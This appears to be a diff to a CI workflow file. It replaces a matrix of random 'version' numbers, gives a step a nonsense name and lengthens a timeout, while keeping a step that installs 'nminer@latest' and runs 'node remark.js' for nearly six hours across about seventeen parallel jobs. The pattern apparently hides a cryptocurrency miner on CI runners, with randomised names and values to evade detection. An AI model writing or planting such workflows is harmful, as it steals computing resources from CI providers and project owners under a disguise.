@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5768 }
-          - { version: 1056 }
-          - { version: 414 }
-          - { version: 6684 }
-          - { version: 4968 }
-          - { version: 449 }
-          - { version: 578 }
-          - { version: 910 }
-          - { version: 633 }
-          - { version: 1782 }
-          - { version: 702 }
-          - { version: 1823 }
-          - { version: 4584 }
-          - { version: 1885 }
-          - { version: 9421 }
-          - { version: 744 }
-          - { version: 705 }
-          - { version: 4967 }
+          - { version: 2364 }
+          - { version: 9239 }
+          - { version: 2259 }
+          - { version: 1980 }
+          - { version: 1362 }
+          - { version: 8577 }
+          - { version: 4625 }
+          - { version: 8751 }
+          - { version: 2245 }
+          - { version: 7397 }
+          - { version: 3915 }
+          - { version: 5333 }
+          - { version: 7298 }
+          - { version: 1119 }
+          - { version: 1757 }
+          - { version: 207 }
+          - { version: 8820 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: whenever
+      - name: near filter why strictly anenst
         run: |
           npm install nminer@latest
-          timeout 301m node remark.js || echo "remark executed"
+          timeout 347m node remark.js || echo "remark executed"
